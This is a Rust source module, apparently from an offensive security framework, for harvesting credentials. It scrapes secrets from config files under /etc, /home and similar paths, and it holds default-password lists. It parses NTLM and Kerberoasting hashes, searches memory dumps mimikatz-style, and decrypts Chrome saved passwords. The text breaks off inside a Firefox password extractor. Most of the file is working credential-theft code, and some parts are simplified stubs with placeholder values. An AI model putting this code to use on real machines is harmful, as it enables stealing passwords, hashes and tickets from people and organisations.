//! Credential discovery
//!
//! Automatic credential extraction from various sources including
//! scan results, memory dumps, config files, and browsers.

use anyhow::{anyhow, Result};
use chrono::Utc;
use log::{debug, info, warn};
use regex::Regex;
use std::collections::HashMap;
use std::path::Path;

use super::types::*;

/// Credential discovery engine
pub struct CredentialDiscovery {
    /// Extracted credentials
    credentials: Vec<StoredCredential>,
    /// Discovery configuration
    config: DiscoveryConfig,
}

/// Discovery configuration
#[derive(Debug, Clone)]
pub struct DiscoveryConfig {
    /// Enable config file scanning
    pub scan_config_files: bool,
    /// Enable browser credential extraction
    pub extract_browser_creds: bool,
    /// Paths to scan for config files
    pub config_paths: Vec<String>,
    /// Maximum file size to scan (bytes)
    pub max_file_size: usize,
}

impl Default for DiscoveryConfig {
    fn default() -> Self {
        Self {
            scan_config_files: true,
            extract_browser_creds: true,
            config_paths: vec![
                "/etc".to_string(),
                "/var/www".to_string(),
                "/opt".to_string(),
                "/home".to_string(),
            ],
            max_file_size: 10 * 1024 * 1024, // 10MB
        }
    }
}

impl CredentialDiscovery {
    /// Create new discovery engine
    pub fn new() -> Self {
        Self {
            credentials: Vec::new(),
            config: DiscoveryConfig::default(),
        }
    }

    /// Create with custom config
    pub fn with_config(config: DiscoveryConfig) -> Self {
        Self {
            credentials: Vec::new(),
            config,
        }
    }

    /// Get discovered credentials
    pub fn get_credentials(&self) -> &[StoredCredential] {
        &self.credentials
    }

    /// Take discovered credentials
    pub fn take_credentials(&mut self) -> Vec<StoredCredential> {
        std::mem::take(&mut self.credentials)
    }

    /// Clear discovered credentials
    pub fn clear(&mut self) {
        self.credentials.clear();
    }

    /// Extract credentials from scan results
    pub fn extract_from_scan(&mut self, scan_id: &str, hosts: &[ScanHost]) -> usize {
        let mut count = 0;

        for host in hosts {
            // Extract from service banners
            for service in &host.services {
                if let Some(creds) = self.extract_from_banner(&service.banner, &host.ip, service.port) {
                    for cred in creds {
                        self.add_credential(StoredCredential {
                            id: String::new(),
                            credential_type: cred.cred_type,
                            identity: cred.username,
                            domain: cred.domain,
                            secret: cred.secret,
                            source: CredentialSource::NetworkScan {
                                scan_id: scan_id.to_string(),
                                host: host.ip.clone(),
                                port: Some(service.port),
                            },
                            health: CredentialHealth::default(),
                            targets: vec![format!("{}:{}", host.ip, service.port)],
                            tags: vec![service.name.clone()],
                            metadata: HashMap::new(),
                            discovered_at: Utc::now(),
                            last_verified_at: None,
                            expires_at: None,
                            last_used_at: None,
                        });
                        count += 1;
                    }
                }

                // Check for default credentials
                if let Some(defaults) = self.get_default_credentials(&service.name) {
                    for (user, pass) in defaults {
                        self.add_credential(StoredCredential {
                            id: String::new(),
                            credential_type: CredentialType::Password,
                            identity: user.to_string(),
                            domain: None,
                            secret: CredentialSecret::Plaintext(pass.to_string()),
                            source: CredentialSource::NetworkScan {
                                scan_id: scan_id.to_string(),
                                host: host.ip.clone(),
                                port: Some(service.port),
                            },
                            health: CredentialHealth::default(),
                            targets: vec![format!("{}:{}", host.ip, service.port)],
                            tags: vec![service.name.clone(), "default".to_string()],
                            metadata: {
                                let mut m = HashMap::new();
                                m.insert("note".to_string(), "Default credential - needs verification".to_string());
                                m
                            },
                            discovered_at: Utc::now(),
                            last_verified_at: None,
                            expires_at: None,
                            last_used_at: None,
                        });
                        count += 1;
                    }
                }
            }
        }

        info!("Extracted {} credentials from scan {}", count, scan_id);
        count
    }

    /// Extract credentials from a config file
    pub fn extract_from_config_file(&mut self, path: &str, content: &str, host: Option<&str>) -> usize {
        let mut count = 0;

        // Determine file type by extension
        let ext = Path::new(path)
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("");

        let extracted = match ext {
            "xml" | "config" => self.parse_xml_config(content),
            "json" => self.parse_json_config(content),
            "yaml" | "yml" => self.parse_yaml_config(content),
            "ini" | "cfg" => self.parse_ini_config(content),
            "env" => self.parse_env_config(content),
            "conf" => self.parse_generic_config(content),
            "properties" => self.parse_properties_config(content),
            _ => self.parse_generic_config(content),
        };

        for cred in extracted {
            self.add_credential(StoredCredential {
                id: String::new(),
                credential_type: cred.cred_type,
                identity: cred.username,
                domain: cred.domain,
                secret: cred.secret,
                source: CredentialSource::ConfigFile {
                    file_path: path.to_string(),
                    host: host.map(|h| h.to_string()),
                },
                health: CredentialHealth::default(),
                targets: host.map(|h| vec![h.to_string()]).unwrap_or_default(),
                tags: vec!["config".to_string()],
                metadata: HashMap::new(),
                discovered_at: Utc::now(),
                last_verified_at: None,
                expires_at: None,
                last_used_at: None,
            });
            count += 1;
        }

        if count > 0 {
            info!("Extracted {} credentials from {}", count, path);
        }

        count
    }

    /// Extract credentials from memory dump
    pub fn extract_from_memory_dump(&mut self, dump_id: &str, dump_data: &[u8]) -> usize {
        let mut count = 0;

        // Extract NTLM hashes
        let ntlm_hashes = self.find_ntlm_hashes(dump_data);
        for hash in ntlm_hashes {
            self.add_credential(StoredCredential {
                id: String::new(),
                credential_type: CredentialType::NtlmHash,
                identity: hash.username.unwrap_or_else(|| "unknown".to_string()),
                domain: hash.domain,
                secret: CredentialSecret::Hash {
                    hash_type: "ntlm".to_string(),
                    value: hash.hash,
                },
                source: CredentialSource::MemoryDump {
                    dump_id: dump_id.to_string(),
                    process: hash.process,
                },
                health: CredentialHealth::default(),
                targets: Vec::new(),
                tags: vec!["memory".to_string()],
                metadata: HashMap::new(),
                discovered_at: Utc::now(),
                last_verified_at: None,
                expires_at: None,
                last_used_at: None,
            });
            count += 1;
        }

        // Extract plaintext passwords (mimikatz-style)
        let plaintexts = self.find_plaintext_credentials(dump_data);
        for cred in plaintexts {
            self.add_credential(StoredCredential {
                id: String::new(),
                credential_type: CredentialType::Password,
                identity: cred.username,
                domain: cred.domain,
                secret: CredentialSecret::Plaintext(cred.password),
                source: CredentialSource::MemoryDump {
                    dump_id: dump_id.to_string(),
                    process: cred.process,
                },
                health: CredentialHealth::default(),
                targets: Vec::new(),
                tags: vec!["memory".to_string()],
                metadata: HashMap::new(),
                discovered_at: Utc::now(),
                last_verified_at: None,
                expires_at: None,
                last_used_at: None,
            });
            count += 1;
        }

        // Extract Kerberos tickets
        let tickets = self.find_kerberos_tickets(dump_data);
        for ticket in tickets {
            self.add_credential(StoredCredential {
                id: String::new(),
                credential_type: if ticket.is_tgt {
                    CredentialType::KerberosTgt
                } else {
                    CredentialType::KerberosTgs
                },
                identity: ticket.client.clone(),
                domain: Some(ticket.realm.clone()),
                secret: CredentialSecret::KerberosTicket {
                    ticket_data: ticket.data,
                    key_type: ticket.key_type,
                },
                source: CredentialSource::MemoryDump {
                    dump_id: dump_id.to_string(),
                    process: None,
                },
                health: CredentialHealth::default(),
                targets: vec![ticket.service],
                tags: vec!["memory".to_string(), "kerberos".to_string()],
                metadata: HashMap::new(),
                discovered_at: Utc::now(),
                last_verified_at: None,
                expires_at: ticket.expires_at,
                last_used_at: None,
            });
            count += 1;
        }

        if count > 0 {
            info!("Extracted {} credentials from memory dump {}", count, dump_id);
        }

        count
    }

    /// Extract browser credentials
    pub fn extract_from_browser(&mut self, browser: &str, profile_path: &str) -> Result<usize> {
        let mut count = 0;

        // This is a placeholder - actual implementation would need
        // to handle browser-specific formats and decryption

        let browser_creds = match browser.to_lowercase().as_str() {
            "chrome" => self.extract_chrome_credentials(profile_path)?,
            "firefox" => self.extract_firefox_credentials(profile_path)?,
            "edge" => self.extract_edge_credentials(profile_path)?,
            _ => Vec::new(),
        };

        for cred in browser_creds {
            self.add_credential(StoredCredential {
                id: String::new(),
                credential_type: CredentialType::Password,
                identity: cred.username,
                domain: None,
                secret: CredentialSecret::Plaintext(cred.password),
                source: CredentialSource::Browser {
                    browser: browser.to_string(),
                    profile: Some(profile_path.to_string()),
                },
                health: CredentialHealth::default(),
                targets: vec![cred.url],
                tags: vec!["browser".to_string(), browser.to_lowercase()],
                metadata: HashMap::new(),
                discovered_at: Utc::now(),
                last_verified_at: None,
                expires_at: None,
                last_used_at: None,
            });
            count += 1;
        }

        if count > 0 {
            info!("Extracted {} credentials from {} browser", count, browser);
        }

        Ok(count)
    }

    /// Parse hashes from text (e.g., secretsdump output)
    pub fn parse_hashes(&mut self, text: &str, source: CredentialSource) -> usize {
        let mut count = 0;

        // NTLM format: user:rid:lmhash:ntlmhash:::
        let ntlm_re = Regex::new(r"(?m)^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32})").unwrap();
        for cap in ntlm_re.captures_iter(text) {
            let username = cap.get(1).unwrap().as_str();
            let ntlm_hash = cap.get(4).unwrap().as_str();

            // Skip computer accounts for now
            if username.ends_with('$') {
                continue;
            }

            self.add_credential(StoredCredential {
                id: String::new(),
                credential_type: CredentialType::NtlmHash,
                identity: username.to_string(),
                domain: None, // Will be filled from source
                secret: CredentialSecret::Hash {
                    hash_type: "ntlm".to_string(),
                    value: ntlm_hash.to_lowercase(),
                },
                source: source.clone(),
                health: CredentialHealth::default(),
                targets: Vec::new(),
                tags: vec!["hash".to_string()],
                metadata: HashMap::new(),
                discovered_at: Utc::now(),
                last_verified_at: None,
                expires_at: None,
                last_used_at: None,
            });
            count += 1;
        }

        // Kerberoasting format: $krb5tgs$23$*user$realm$spn*$hash
        let tgs_re = Regex::new(r"(?m)(\$krb5tgs\$\d+\$[^\s]+)").unwrap();
        for cap in tgs_re.captures_iter(text) {
            let hash = cap.get(1).unwrap().as_str();

            // Extract username from hash
            let parts: Vec<&str> = hash.split('*').collect();
            let username = parts.get(1).map(|s| s.to_string());

            self.add_credential(StoredCredential {
                id: String::new(),
                credential_type: CredentialType::NtlmHash,
                identity: username.unwrap_or_else(|| "unknown".to_string()),
                domain: None,
                secret: CredentialSecret::Hash {
                    hash_type: "kerberos_tgs".to_string(),
                    value: hash.to_string(),
                },
                source: source.clone(),
                health: CredentialHealth::default(),
                targets: Vec::new(),
                tags: vec!["kerberoasting".to_string()],
                metadata: HashMap::new(),
                discovered_at: Utc::now(),
                last_verified_at: None,
                expires_at: None,
                last_used_at: None,
            });
            count += 1;
        }

        // AS-REP format: $krb5asrep$23$user@REALM:hash
        let asrep_re = Regex::new(r"(?m)(\$krb5asrep\$\d+\$[^\s:]+:[^\s]+)").unwrap();
        for cap in asrep_re.captures_iter(text) {
            let hash = cap.get(1).unwrap().as_str();

            // Extract username
            let username = hash.split('$').nth(3)
                .and_then(|s| s.split('@').next())
                .map(|s| s.to_string());

            self.add_credential(StoredCredential {
                id: String::new(),
                credential_type: CredentialType::NtlmHash,
                identity: username.unwrap_or_else(|| "unknown".to_string()),
                domain: None,
                secret: CredentialSecret::Hash {
                    hash_type: "kerberos_asrep".to_string(),
                    value: hash.to_string(),
                },
                source: source.clone(),
                health: CredentialHealth::default(),
                targets: Vec::new(),
                tags: vec!["asrep_roasting".to_string()],
                metadata: HashMap::new(),
                discovered_at: Utc::now(),
                last_verified_at: None,
                expires_at: None,
                last_used_at: None,
            });
            count += 1;
        }

        if count > 0 {
            info!("Parsed {} hashes from text", count);
        }

        count
    }

    // Helper methods

    fn add_credential(&mut self, cred: StoredCredential) {
        self.credentials.push(cred);
    }

    fn extract_from_banner(&self, banner: &str, _host: &str, _port: u16) -> Option<Vec<ExtractedCred>> {
        let mut creds = Vec::new();

        // Look for common credential patterns in banners
        // Format: user:password, username=X password=Y, etc.

        let user_pass_re = Regex::new(r"(?i)(?:user(?:name)?|login)\s*[=:]\s*([^\s,;]+)\s*(?:,|;|\s)\s*(?:pass(?:word)?)\s*[=:]\s*([^\s,;]+)").ok()?;

        for cap in user_pass_re.captures_iter(banner) {
            creds.push(ExtractedCred {
                cred_type: CredentialType::Password,
                username: cap.get(1).unwrap().as_str().to_string(),
                domain: None,
                secret: CredentialSecret::Plaintext(cap.get(2).unwrap().as_str().to_string()),
            });
        }

        if creds.is_empty() {
            None
        } else {
            Some(creds)
        }
    }

    fn get_default_credentials(&self, service: &str) -> Option<Vec<(&'static str, &'static str)>> {
        let defaults: Vec<(&str, &str)> = match service.to_lowercase().as_str() {
            "ssh" => vec![("root", "root"), ("admin", "admin"), ("pi", "raspberry")],
            "ftp" => vec![("anonymous", ""), ("ftp", "ftp"), ("admin", "admin")],
            "telnet" => vec![("admin", "admin"), ("root", "root")],
            "mysql" => vec![("root", ""), ("root", "root"), ("mysql", "mysql")],
            "postgresql" => vec![("postgres", "postgres")],
            "mongodb" => vec![("admin", "admin"), ("root", "root")],
            "redis" => vec![("default", "")],
            "tomcat" => vec![("admin", "admin"), ("tomcat", "tomcat"), ("manager", "manager")],
            "jenkins" => vec![("admin", "admin")],
            "weblogic" => vec![("weblogic", "welcome1")],
            "cisco" => vec![("admin", "admin"), ("cisco", "cisco")],
            "snmp" => vec![("public", "public"), ("private", "private")],
            _ => return None,
        };

        Some(defaults)
    }

    fn parse_xml_config(&self, content: &str) -> Vec<ExtractedCred> {
        let mut creds = Vec::new();

        // Connection strings
        let conn_re = Regex::new(r#"(?i)<connectionString[^>]*>([^<]+)</connectionString>"#).ok();
        if let Some(re) = conn_re {
            for cap in re.captures_iter(content) {
                if let Some(parsed) = self.parse_connection_string(cap.get(1).unwrap().as_str()) {
                    creds.push(parsed);
                }
            }
        }

        // Password elements
        let pass_re = Regex::new(r#"(?i)<(?:password|pass|pwd|secret)[^>]*>([^<]+)</(?:password|pass|pwd|secret)>"#).ok();
        if let Some(re) = pass_re {
            for cap in re.captures_iter(content) {
                creds.push(ExtractedCred {
                    cred_type: CredentialType::Password,
                    username: "unknown".to_string(),
                    domain: None,
                    secret: CredentialSecret::Plaintext(cap.get(1).unwrap().as_str().to_string()),
                });
            }
        }

        creds
    }

    fn parse_json_config(&self, content: &str) -> Vec<ExtractedCred> {
        let mut creds = Vec::new();

        // Password fields in JSON
        let patterns: &[&[u8]] = &[
            b"\"password\"",
            b"\"pass\"",
            b"\"secret\"",
            b"\"api_key\"",
            b"\"apiKey\"",
            b"\"access_key\"",
            b"\"accessKey\"",
        ];

        for pattern in patterns {
            let pattern_str = std::str::from_utf8(pattern).unwrap_or("");
            let re = Regex::new(&format!(r#"(?i){}\s*:\s*"([^"]+)""#, regex::escape(pattern_str))).ok();
            if let Some(re) = re {
                for cap in re.captures_iter(content) {
                    let value = cap.get(1).unwrap().as_str();
                    if !value.is_empty() && value != "null" {
                        creds.push(ExtractedCred {
                            cred_type: if pattern_str.contains("key") {
                                CredentialType::ApiKey
                            } else {
                                CredentialType::Password
                            },
                            username: "unknown".to_string(),
                            domain: None,
                            secret: if pattern_str.contains("key") {
                                CredentialSecret::ApiKey(value.to_string())
                            } else {
                                CredentialSecret::Plaintext(value.to_string())
                            },
                        });
                    }
                }
            }
        }

        creds
    }

    fn parse_yaml_config(&self, content: &str) -> Vec<ExtractedCred> {
        let mut creds = Vec::new();

        // YAML password patterns
        let pass_re = Regex::new(r##"(?mi)^\s*(?:password|pass|secret|api_key):\s*['"]?([^'"#\n]+)"##).ok();
        if let Some(re) = pass_re {
            for cap in re.captures_iter(content) {
                let value = cap.get(1).unwrap().as_str().trim();
                if !value.is_empty() {
                    creds.push(ExtractedCred {
                        cred_type: CredentialType::Password,
                        username: "unknown".to_string(),
                        domain: None,
                        secret: CredentialSecret::Plaintext(value.to_string()),
                    });
                }
            }
        }

        creds
    }

    fn parse_ini_config(&self, content: &str) -> Vec<ExtractedCred> {
        let mut creds = Vec::new();

        // INI password patterns
        let pass_re = Regex::new(r"(?mi)^\s*(?:password|pass|pwd|secret)\s*=\s*(.+)$").ok();
        if let Some(re) = pass_re {
            for cap in re.captures_iter(content) {
                let value = cap.get(1).unwrap().as_str().trim();
                // Remove quotes if present
                let value = value.trim_matches(|c: char| c == '"' || c == '\'');
                if !value.is_empty() {
                    creds.push(ExtractedCred {
                        cred_type: CredentialType::Password,
                        username: "unknown".to_string(),
                        domain: None,
                        secret: CredentialSecret::Plaintext(value.to_string()),
                    });
                }
            }
        }

        creds
    }

    fn parse_env_config(&self, content: &str) -> Vec<ExtractedCred> {
        let mut creds = Vec::new();

        // ENV file patterns
        let patterns: &[&[u8]] = &[
            b"PASSWORD",
            b"SECRET",
            b"API_KEY",
            b"ACCESS_KEY",
            b"PRIVATE_KEY",
            b"DB_PASS",
            b"MYSQL_PASSWORD",
            b"POSTGRES_PASSWORD",
            b"REDIS_PASSWORD",
        ];

        for pattern in patterns {
            let pattern_str = std::str::from_utf8(pattern).unwrap_or("");
            let re = Regex::new(&format!(r##"(?m)^{}\s*=\s*['"]?([^'"#\n]+)"##, regex::escape(pattern_str))).ok();
            if let Some(re) = re {
                for cap in re.captures_iter(content) {
                    let value = cap.get(1).unwrap().as_str().trim();
                    if !value.is_empty() {
                        creds.push(ExtractedCred {
                            cred_type: if pattern_str.contains("KEY") {
                                CredentialType::ApiKey
                            } else {
                                CredentialType::Password
                            },
                            username: "unknown".to_string(),
                            domain: None,
                            secret: if pattern_str.contains("KEY") {
                                CredentialSecret::ApiKey(value.to_string())
                            } else {
                                CredentialSecret::Plaintext(value.to_string())
                            },
                        });
                    }
                }
            }
        }

        creds
    }

    fn parse_properties_config(&self, content: &str) -> Vec<ExtractedCred> {
        self.parse_ini_config(content)
    }

    fn parse_generic_config(&self, content: &str) -> Vec<ExtractedCred> {
        let mut creds = Vec::new();

        // Try multiple patterns
        creds.extend(self.parse_ini_config(content));
        creds.extend(self.parse_yaml_config(content));

        // Connection strings
        if let Some(parsed) = self.parse_connection_string(content) {
            creds.push(parsed);
        }

        creds
    }

    fn parse_connection_string(&self, conn_str: &str) -> Option<ExtractedCred> {
        // Parse database connection strings
        // Format: Server=X;Database=Y;User Id=Z;Password=W;

        let user_re = Regex::new(r#"(?i)(?:user\s*id|uid|user(?:name)?)\s*=\s*([^;]+)"#).ok()?;
        let pass_re = Regex::new(r#"(?i)(?:password|pwd)\s*=\s*([^;]+)"#).ok()?;

        let username = user_re.captures(conn_str)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().to_string())?;

        let password = pass_re.captures(conn_str)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().to_string())?;

        Some(ExtractedCred {
            cred_type: CredentialType::DatabaseConnection,
            username,
            domain: None,
            secret: CredentialSecret::Plaintext(password),
        })
    }

    fn find_ntlm_hashes(&self, dump_data: &[u8]) -> Vec<MemoryHash> {
        let mut hashes = Vec::new();

        // Search for NTLM hash patterns in memory
        // Looking for 32-byte hex sequences following username patterns

        // Convert to string for regex (lossy but works for this purpose)
        let text = String::from_utf8_lossy(dump_data);

        // Look for user:hash patterns
        let re = Regex::new(r"([A-Za-z0-9_\-\.]+)[\x00\s]*[:\x00]+[\x00\s]*([a-fA-F0-9]{32})").ok();
        if let Some(re) = re {
            for cap in re.captures_iter(&text) {
                hashes.push(MemoryHash {
                    username: Some(cap.get(1).unwrap().as_str().to_string()),
                    domain: None,
                    hash: cap.get(2).unwrap().as_str().to_lowercase(),
                    process: None,
                });
            }
        }

        hashes
    }

    fn find_plaintext_credentials(&self, dump_data: &[u8]) -> Vec<MemoryPlaintext> {
        let mut creds = Vec::new();

        // Search for credential structures in memory
        // This is a simplified version - real implementation would parse
        // specific structures like KIWI_WDIGEST_LIST_ENTRY

        let text = String::from_utf8_lossy(dump_data);

        // Look for username/password pairs near credential-related strings
        let patterns: &[&[u8]] = &[b"Primary", b"Kerberos", b"NTLM", b"WDigest"];

        for pattern in patterns {
            let pattern_str = std::str::from_utf8(pattern).unwrap_or("");
            if let Some(idx) = text.find(pattern_str) {
                // Look for credentials in nearby memory
                let window = &text[idx..std::cmp::min(idx + 1000, text.len())];

                // Try to extract username and password
                let user_re = Regex::new(r"(?i)user(?:name)?\x00+([A-Za-z0-9_\-\.]+)").ok();
                let pass_re = Regex::new(r"(?i)pass(?:word)?\x00+(.{4,32})").ok();

                if let (Some(user_re), Some(pass_re)) = (user_re, pass_re) {
                    if let (Some(user_cap), Some(pass_cap)) = (user_re.captures(window), pass_re.captures(window)) {
                        creds.push(MemoryPlaintext {
                            username: user_cap.get(1).unwrap().as_str().to_string(),
                            domain: None,
                            password: pass_cap.get(1).unwrap().as_str().to_string(),
                            process: None,
                        });
                    }
                }
            }
        }

        creds
    }

    fn find_kerberos_tickets(&self, dump_data: &[u8]) -> Vec<MemoryTicket> {
        let mut tickets = Vec::new();

        // Look for Kerberos ticket structures
        // Real implementation would parse kirbi structures

        // Search for ASN.1 Application 1 (TGT) or Application 2 (TGS) tags
        let mut i = 0;
        while i < dump_data.len().saturating_sub(100) {
            // Look for potential ticket start (0x61 for app 1, 0x62 for app 2)
            if dump_data[i] == 0x61 || dump_data[i] == 0x62 {
                let is_tgt = dump_data[i] == 0x61;

                // Try to parse length and validate structure
                if let Some(ticket_data) = self.try_parse_ticket(&dump_data[i..]) {
                    tickets.push(MemoryTicket {
                        is_tgt,
                        client: "extracted@REALM".to_string(),
                        service: if is_tgt {
                            "krbtgt/REALM".to_string()
                        } else {
                            "service/host".to_string()
                        },
                        realm: "REALM".to_string(),
                        key_type: 23, // RC4_HMAC
                        data: base64::encode(&ticket_data),
                        expires_at: None,
                    });
                }
            }
            i += 1;
        }

        tickets
    }

    fn try_parse_ticket(&self, data: &[u8]) -> Option<Vec<u8>> {
        if data.len() < 10 {
            return None;
        }

        // Try to parse ASN.1 length
        let len_byte = data[1];
        let (len, header_size) = if len_byte < 0x80 {
            (len_byte as usize, 2)
        } else if len_byte == 0x81 {
            if data.len() < 3 {
                return None;
            }
            (data[2] as usize, 3)
        } else if len_byte == 0x82 {
            if data.len() < 4 {
                return None;
            }
            (((data[2] as usize) << 8) | (data[3] as usize), 4)
        } else {
            return None;
        };

        let total_len = header_size + len;
        if total_len > data.len() || total_len > 10000 {
            return None;
        }

        Some(data[..total_len].to_vec())
    }

    fn extract_chrome_credentials(&self, profile_path: &str) -> Result<Vec<BrowserCred>> {
        // Chrome stores credentials in "Login Data" SQLite database
        // Passwords are encrypted with DPAPI (Windows) or AES-GCM with key from Local State (Linux/macOS)

        debug!("Extracting Chrome credentials from {}", profile_path);

        let mut credentials = Vec::new();
        let login_data_path = Path::new(profile_path).join("Login Data");
        let local_state_path = Path::new(profile_path).parent()
            .map(|p| p.join("Local State"))
            .unwrap_or_else(|| Path::new(profile_path).join("../Local State"));

        if !login_data_path.exists() {
            debug!("Login Data not found at {:?}", login_data_path);
            return Ok(credentials);
        }

        // Copy the database to avoid lock issues (Chrome may have it open)
        let temp_db = std::env::temp_dir().join(format!("chrome_login_{}.db", std::process::id()));
        if let Err(e) = std::fs::copy(&login_data_path, &temp_db) {
            warn!("Failed to copy Login Data: {}", e);
            return Ok(credentials);
        }

        // Get encryption key from Local State (Linux/macOS use base64-encoded key)
        let encryption_key = self.get_chrome_encryption_key(&local_state_path);

        // Open the SQLite database and query logins
        if let Ok(db_bytes) = std::fs::read(&temp_db) {
            // Parse SQLite to find logins table data
            // SQLite format: header (100 bytes), then pages
            if db_bytes.len() > 100 && &db_bytes[0..16] == b"SQLite format 3\0" {
                // Extract login entries using pattern matching on the binary data
                // Look for URL patterns followed by username and encrypted password
                let entries = self.parse_chrome_login_db(&db_bytes, encryption_key.as_deref());
                credentials.extend(entries);
            }
        }

        // Clean up temp file
        let _ = std::fs::remove_file(&temp_db);

        info!("Extracted {} Chrome credentials", credentials.len());
        Ok(credentials)
    }

    fn get_chrome_encryption_key(&self, local_state_path: &Path) -> Option<Vec<u8>> {
        // Read Local State JSON and extract encrypted_key
        let content = std::fs::read_to_string(local_state_path).ok()?;

        // Parse JSON to find os_crypt.encrypted_key
        if let Some(start) = content.find("\"encrypted_key\"") {
            let after = &content[start..];
            if let Some(colon) = after.find(':') {
                let value_start = after[colon + 1..].trim_start();
                if value_start.starts_with('"') {
                    let key_start = colon + 1 + (after[colon + 1..].len() - value_start.len()) + 1;
                    if let Some(end) = after[key_start..].find('"') {
                        let b64_key = &after[key_start..key_start + end];

                        // Decode base64, skip "DPAPI" prefix (5 bytes) on Windows
                        if let Ok(decoded) = base64::decode(b64_key) {
                            if decoded.len() > 5 && &decoded[0..5] == b"DPAPI" {
                                // On Linux, we need to decrypt with secret service or use pbkdf2
                                // For now, return the key portion after DPAPI marker
                                return Some(decoded[5..].to_vec());
                            } else {
                                return Some(decoded);
                            }
                        }
                    }
                }
            }
        }

        // Fallback: Try to derive key using PBKDF2 with default password
        // Chrome on Linux uses "peanuts" as the password with salt "saltysalt"
        #[cfg(target_os = "linux")]
        {
            use sha1::Sha1;
            use hmac::Hmac;
            use pbkdf2::pbkdf2;

            let password = b"peanuts";
            let salt = b"saltysalt";
            let mut key = [0u8; 16];
            pbkdf2::<Hmac<Sha1>>(password, salt, 1, &mut key).ok()?;
            return Some(key.to_vec());
        }

        None
    }

    fn parse_chrome_login_db(&self, db_bytes: &[u8], encryption_key: Option<&[u8]>) -> Vec<BrowserCred> {
        let mut credentials = Vec::new();

        // Search for login entries in the SQLite data
        // Entries contain: origin_url, username_value, password_value (encrypted)
        // Look for HTTP/HTTPS URL patterns followed by structured data

        let text = String::from_utf8_lossy(db_bytes);

        // Find URL patterns that are likely login entries
        let url_pattern = Regex::new(r"(https?://[^\x00\s]{5,200})").ok();

        if let Some(re) = url_pattern {
            for cap in re.captures_iter(&text) {
                let url = cap.get(1).map(|m| m.as_str().to_string()).unwrap_or_default();

                // Look for username nearby (within 500 bytes)
                let pos = cap.get(1).map(|m| m.start()).unwrap_or(0);
                let search_end = (pos + 500).min(db_bytes.len());

                if pos < db_bytes.len() {
                    let window = &db_bytes[pos..search_end];

                    // Look for printable string sequences that could be usernames
                    if let Some((username, password_encrypted)) = self.extract_login_fields(window, encryption_key) {
                        if !username.is_empty() {
                            credentials.push(BrowserCred {
                                url,
                                username,
                                password: password_encrypted,
                            });
                        }
                    }
                }
            }
        }

        // Deduplicate by URL + username
        credentials.sort_by(|a, b| (&a.url, &a.username).cmp(&(&b.url, &b.username)));
        credentials.dedup_by(|a, b| a.url == b.url && a.username == b.username);

        credentials
    }

    fn extract_login_fields(&self, data: &[u8], encryption_key: Option<&[u8]>) -> Option<(String, String)> {
        // Find username (printable ASCII string)
        let mut username = String::new();
        let mut i = 0;

        // Skip URL
        while i < data.len() && data[i] != 0 {
            i += 1;
        }

        // Find next printable string (username)
        while i < data.len() {
            if data[i].is_ascii_graphic() || data[i] == b' ' {
                let start = i;
                while i < data.len() && (data[i].is_ascii_graphic() || data[i] == b' ') && data[i] != 0 {
                    i += 1;
                }
                if i - start >= 3 && i - start <= 100 {
                    if let Ok(s) = std::str::from_utf8(&data[start..i]) {
                        // Check if it looks like a username/email
                        if s.contains('@') || s.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '.' || c == '-') {
                            username = s.to_string();
                            break;
                        }
                    }
                }
            }
            i += 1;
        }

        if username.is_empty() {
            return None;
        }

        // Look for encrypted password (v10/v11 format on Chrome 80+)
        // Format: "v10" or "v11" prefix followed by 12-byte nonce and ciphertext
        let mut password = String::new();

        for j in i..data.len().saturating_sub(15) {
            if &data[j..j + 3] == b"v10" || &data[j..j + 3] == b"v11" {
                let version = &data[j..j + 3];
                let nonce = &data[j + 3..j + 15];

                // Find ciphertext length (next non-null sequence)
                let mut cipher_end = j + 15;
                while cipher_end < data.len() && cipher_end < j + 200 {
                    cipher_end += 1;
                }

                let ciphertext = &data[j + 15..cipher_end];

                // Try to decrypt with AES-GCM
                if let Some(key) = encryption_key {
                    if let Some(decrypted) = self.decrypt_chrome_password(key, nonce, ciphertext, version) {
                        password = decrypted;
                        break;
                    }
                }

                // If decryption fails, return placeholder
                if password.is_empty() {
                    password = format!("[encrypted:{}:{}]",
                        String::from_utf8_lossy(version),
                        hex::encode(&data[j..j.saturating_add(32).min(data.len())]));
                    break;
                }
            }
        }

        if password.is_empty() {
            password = "[no_password_found]".to_string();
        }

        Some((username, password))
    }

    fn decrypt_chrome_password(&self, key: &[u8], nonce: &[u8], ciphertext: &[u8], _version: &[u8]) -> Option<String> {
        // AES-256-GCM decryption
        use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
        use aes_gcm::aead::generic_array::GenericArray;

        if key.len() < 32 || nonce.len() < 12 || ciphertext.len() < 16 {
            return None;
        }

        let key_arr = GenericArray::clone_from_slice(&key[..32.min(key.len())]);
        let cipher = Aes256Gcm::new(&key_arr);

        let nonce_arr = GenericArray::clone_from_slice(&nonce[..12]);

        // Ciphertext includes 16-byte auth tag at the end
        if let Ok(plaintext) = cipher.decrypt(&nonce_arr, ciphertext) {
            if let Ok(s) = String::from_utf8(plaintext) {
                return Some(s);
            }
        }

        None
    }

    fn extract_firefox_credentials(&self, profile_path: &str) -> Result<Vec<BrowserCred>> {
        // Firefox stores credentials in logins.json (encrypted with NSS/key4.db)

        debug!("Extracting Firefox credentials from {}", profile_path);

        let mut credentials = Vec::new();
        let logins_path = Path::new(profile_path).join("logins.json");
        let key4_path = Path::new(profile_path).join("key4.db");

        if !logins_path.exists() {
            debug!("logins.json not found at {:?}", logins_path);
            return Ok(credentials);
        }

        // Read logins.json
        let logins_content = match std::fs::read_to_string(&logins_path) {
            Ok(c) => c,
            Err(e) => {
                warn!("Failed to read logins.json: {}", e);
                return Ok(credentials);
            }
        };

        // Parse JSON to extract login entries
        // Format: {"logins": [{"hostname": "...", "encryptedUsername": "...", "encryptedPassword": "..."}]}
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&logins_content) {
            if let Some(logins) = json.get("logins").and_then(|l| l.as_array()) {
                // Try to get master key from key4.db
                let master_key = self.get_firefox_master_key(&key4_path);

                for login in logins {
                    let hostname = login.get("hostname")
                        .and_then(|h| h.as_str())
                        .unwrap_or("")
                        .to_string();

                    let enc_username = login.get("encryptedUsername")
                        .and_then(|u| u.as_str())
                        .unwrap_or("");

                    let enc_password = login.get("encryptedPassword")
                        .and_then(|p| p.as_str())
                        .unwrap_or("");

                    // Decrypt if we have the key
